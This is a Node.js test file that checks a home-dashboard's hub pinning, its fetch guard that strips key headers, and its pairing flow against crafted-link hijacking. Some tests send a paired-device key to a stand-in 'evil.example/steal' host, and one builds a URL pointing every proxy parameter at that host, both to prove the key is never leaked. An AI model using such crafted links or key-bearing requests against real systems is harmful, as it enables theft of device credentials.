/* HUBPIN1 · a crafted link can never move a paired screen's hub or carry its key anywhere.
   - house-hub.js: SHA-256 pinned origins, fail closed, fetch guard strips key headers off-list
   - no client script ingests a hub/proxy address from ?lightsProxy= / ?proxy= / ?nestProxy= / ?spotifyProxy= / #hub=
   - pairing redeems against the built-in or saved hub; HUBPAIR1: a link's &hub= is used only by a screen with no valid hub,
     only through HouseHub.okLinkHub (pinned, no QA origin on a real host); hubpair1.test.mjs covers accept/reject
   - no house hostname in the tree (checked against the box's private config when present)
   node --test scripts/qa/hubpin1.test.mjs */
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import vm from "node:vm";
import crypto from "node:crypto";
import { execFileSync, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const read = (f) => fs.readFileSync(path.join(ROOT, f), "utf8");
const KEY = "paired-device-key-0123456789abcdef";

/* a tiny browser: location, localStorage, history, a recording fetch */
function browser(href, store = {}) {
  const calls = [];
  const u = new URL(href);
  const ls = { ...store };
  const win = {
    location: { href, origin: u.origin, hostname: u.hostname, pathname: u.pathname, search: u.search, hash: u.hash, replace() {} },
    localStorage: { getItem: (k) => (k in ls ? ls[k] : null), setItem: (k, v) => { ls[k] = String(v); }, removeItem: (k) => { delete ls[k]; } },
    sessionStorage: { getItem: () => null, setItem() {}, removeItem() {} },
    history: { state: null, replaceState() {} },
    fetch: (input, init = {}) => {
      const url = typeof input === "string" ? input : input.url;
      let headers = init.headers || (input && input.headers) || {};
      if (headers && typeof headers.forEach === "function" && !Array.isArray(headers)) { const o = {}; headers.forEach((v, k) => { o[k] = v; }); headers = o; }
      calls.push({ url, headers });
      return Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve({}), text: () => Promise.resolve("") });
    },
    URL, Request: globalThis.Request, Headers: globalThis.Headers,
    setTimeout, clearTimeout, console,
  };
  win.window = win; win.globalThis = win;
  const ctx = vm.createContext(win);
  vm.runInContext(read("house-hub.js"), ctx);
  return { win, ctx, calls, ls };
}
const keyHeaders = (h) => Object.keys(h || {}).filter((k) => /^(x-lights-proxy-token|x-nest-proxy-token|x-private-feed-token|authorization)$/i.test(k));

test("house-hub: built-in sha256 matches node crypto; allow-list holds hashes only, no hostnames", () => {
  const { win } = browser("https://cams.qa.invalid/sheet-index.html");
  for (const s of ["", "abc", "https://hub.qa.invalid", "x".repeat(130)]) assert.equal(win.HouseHub._sha256(s), crypto.createHash("sha256").update(s).digest("hex"));
  const src = read("house-hub.js");
  const pin = /var PIN = \[([^\]]*)\]/.exec(src)[1];
  for (const e of pin.split(",")) assert.match(e.trim(), /^"[0-9a-f]{64}"$/);
  assert.ok(pin.includes(crypto.createHash("sha256").update("https://hub.qa.invalid").digest("hex")));
});

test("house-hub: only pinned origins get the key; saved off-list hubs are ignored (fail closed)", () => {
  const { win } = browser("https://cams.qa.invalid/sheet-index.html", { "wardos-lights-proxy": "https://evil.example", "wardos-lights-proxy-token": KEY });
  const H = win.HouseHub;
  assert.equal(H.okForKey("https://hub.qa.invalid/api/lights"), true);
  assert.equal(H.okForKey("https://evil.example/api/lights"), false);
  assert.equal(H.okForKey("https://hub.qa.invalid.evil.example/"), false);
  assert.equal(H.okForKey("http://hub.qa.invalid/"), false, "https only");
  assert.equal(H.okForKey("http://127.0.0.1:8788/"), false, "loopback only for a loopback page");
  assert.notEqual(H.lights(), "https://evil.example");
  assert.equal(H.saveLights("https://evil.example"), false);
  const loop = browser("http://127.0.0.1:18798/sheet-index.html").win.HouseHub;
  assert.equal(loop.okForKey("http://127.0.0.1:8788/x"), true, "box preview");
  assert.equal(loop.lights(), "https://hub.qa.invalid");
});

test("never-send-key-off-list: the fetch guard strips every key header to an unlisted origin (object, Headers, Request)", async () => {
  const b = browser("https://cams.qa.invalid/sheet-index.html");
  const f = b.win.fetch;
  await f("https://evil.example/steal", { headers: { "X-Lights-Proxy-Token": KEY, Authorization: "Bearer " + KEY, "X-Nest-Proxy-Token": KEY, "X-Private-Feed-Token": KEY, Accept: "x" } });
  await f("https://evil.example/steal", { headers: new Headers({ "x-lights-proxy-token": KEY }) });
  await f(new Request("https://evil.example/steal", { headers: { "X-Lights-Proxy-Token": KEY } }));
  await f("https://hub.qa.invalid/api/lights", { headers: { "X-Lights-Proxy-Token": KEY } });
  const evil = b.calls.filter((c) => c.url.includes("evil.example"));
  assert.equal(evil.length, 3);
  for (const c of evil) assert.deepEqual(keyHeaders(c.headers), [], JSON.stringify(c.headers));
  assert.equal(evil[0].headers.Accept, "x", "other headers survive");
  const good = b.calls.find((c) => c.url.startsWith("https://hub.qa.invalid"));
  assert.deepEqual(keyHeaders(good.headers), ["X-Lights-Proxy-Token"]);
});

test("crafted ?lightsProxy / ?proxy / #hub with a saved key: hub unchanged, key goes nowhere new (private-feed + pairing)", async () => {
  const href = "https://cams.qa.invalid/sheet-index.html?lightsProxy=https://evil.example&proxy=https://evil.example&spotifyProxy=https://evil.example&nestProxy=https://evil.example#pair=AAAAAAAAAAAAAAAAAAAAAA&hub=https://evil.example";
  const b = browser(href, { "wardos-lights-proxy": "https://hub.qa.invalid", "wardos-lights-proxy-token": KEY });
  const els = [];
  const mk = (tag) => { const e = { tag, style: {}, attrs: {}, kids: [], on: {}, setAttribute(k, v) { this.attrs[k] = v; }, appendChild(c) { this.kids.push(c); }, addEventListener(t, f) { this.on[t] = f; }, remove() {} }; els.push(e); return e; };
  const body = mk("body");
  b.win.document = { readyState: "complete", body, addEventListener() {}, querySelectorAll: () => [], querySelector: () => null, head: { appendChild() {} }, documentElement: { appendChild() {}, classList: { add() {}, remove() {}, contains: () => false } }, createElement: mk, getElementById: () => null };
  for (const f of ["private-feed.js", "house-pair.js"]) vm.runInContext(read(f), b.ctx);
  await b.win.PrivateFeed.get("cal-live").catch(() => {});
  await new Promise((r) => setTimeout(r, 50));
  /* TAPPAIR1 · nothing is redeemed on load, or by a scripted click (a link-preview bot); only a real tap redeems */
  assert.ok(!b.calls.some((c) => c.url.endsWith("/api/pair")), "no redeem on page load");
  const go = els.find((e) => "data-pair-go" in e.attrs);
  assert.ok(go && go.on.click, "a 'Pair this screen' button is shown");
  go.on.click({ isTrusted: false });
  await new Promise((r) => setTimeout(r, 20));
  assert.ok(!b.calls.some((c) => c.url.endsWith("/api/pair")), "a scripted click does not redeem");
  go.on.click({ isTrusted: true });
  await new Promise((r) => setTimeout(r, 50));
  assert.equal(b.ls["wardos-lights-proxy"], "https://hub.qa.invalid", "saved hub untouched");
  assert.ok(!b.calls.some((c) => c.url.includes("evil.example")), "nothing sent to the crafted host: " + JSON.stringify(b.calls.map((c) => c.url)));
  const pair = b.calls.find((c) => c.url.endsWith("/api/pair"));
  assert.ok(pair && pair.url.startsWith("https://hub.qa.invalid/"), "after a real tap, pairing redeems against the built-in hub only");
  for (const c of b.calls) if (keyHeaders(c.headers).length) assert.ok(b.win.HouseHub.okForKey(c.url), c.url);
});

test("no client script reads a hub or proxy address from the URL (pairing: only via okLinkHub, HUBPAIR1)", () => {
  for (const f of ["house-lights.js", "house-nest.js", "house-spotify.js", "house-tapsync.js", "private-feed.js", "nest-webrtc-client.js", "house-pair.js", "hub-key-entry.js", "house-sensi-ctl.js"]) {
    const src = read(f).replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
    assert.doesNotMatch(src, /qs\(\s*["'](lightsProxy|proxy|nestProxy|spotifyProxy|hub)["']\s*\)/, f + " reads a hub from the query");
    if (f !== "house-pair.js") assert.doesNotMatch(src, /frag\.hub/, f + " reads a hub from the URL");
    assert.doesNotMatch(src, /searchParams\.get\(\s*["'](lightsProxy|proxy|nestProxy|hub)["']/, f + " reads a hub from the URL");
    assert.doesNotMatch(src, /setItem\(\s*(PROXY_LS_KEY|PROXY_LS|HUB_LS|"wardos-lights-proxy"|"wardosNestProxy")\s*,/, f + " writes the saved hub directly (only HouseHub.saveLights may)");
  }
  /* HUBPAIR1 · house-pair reads the link hub in exactly one place, and only hands it to pickHub (own hub first, then okLinkHub) */
  const hp = read("house-pair.js").replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
  assert.equal((hp.match(/frag\.hub/g) || []).length, 1, "one read of the link hub");
  assert.match(hp, /pickHub\(frag\.hub \|\| ""\)/);
  assert.match(hp, /function pickHub\(linkHub\) \{[\s\S]*?var own = H\.lights\(\);\s*if \(validHub\(own\)\) return own;[\s\S]*?H\.okLinkHub\(linkHub\)/, "own valid hub wins; link hub only via okLinkHub");
  /* the link a Dad screen makes names its own (pinned, valid) hub, never another */
  assert.match(hp, /var link = pairLink\(res\.j\.code, hub\);/);
  assert.doesNotMatch(read("house-nest.js").replace(/\/\*[\s\S]*?\*\//g, ""), /&proxy=/, "viewer links carry no proxy address");
});

test("every page that can send a key loads house-hub.js first", () => {
  const pages = execFileSync("git", ["ls-files", "*.html"], { cwd: ROOT, encoding: "utf8" }).split("\n").filter((f) => f && !/^(plates|ori|scripts\/qa\/fixtures)/.test(f));
  const KEYED = /(private-feed|house-lights|house-nest|house-spotify|house-tapsync|house-sensi-ctl|house-pair|nest-webrtc-client|hub-key-entry)\.js/;
  for (const f of pages) {
    const s = read(f); const m = s.search(new RegExp("<script[^>]*src=\"[^\"]*" + KEYED.source));
    if (m < 0) continue;
    const h = s.indexOf("house-hub.js");
    assert.ok(h > 0 && h < m, f);
  }
});

test("no house hostname anywhere in the tree (box config, when present)", () => {
  const cfg = path.join(os.homedir(), ".config", "wardos");
  const hosts = ["lights-write-proxy.url", "nest-webrtc-proxy.url"].map((f) => { try { return new URL(fs.readFileSync(path.join(cfg, f), "utf8").trim()).hostname; } catch { return ""; } }).filter(Boolean);
  if (!hosts.length) return;
  for (const h of hosts) {
    const r = (spawnSync("git", ["grep", "-l", "-F", h, "--", "."], { cwd: ROOT, encoding: "utf8" }).stdout || "").trim().split("\n").filter(Boolean);
    assert.deepEqual(r, [], "hostname found in tracked files");
  }
}, );
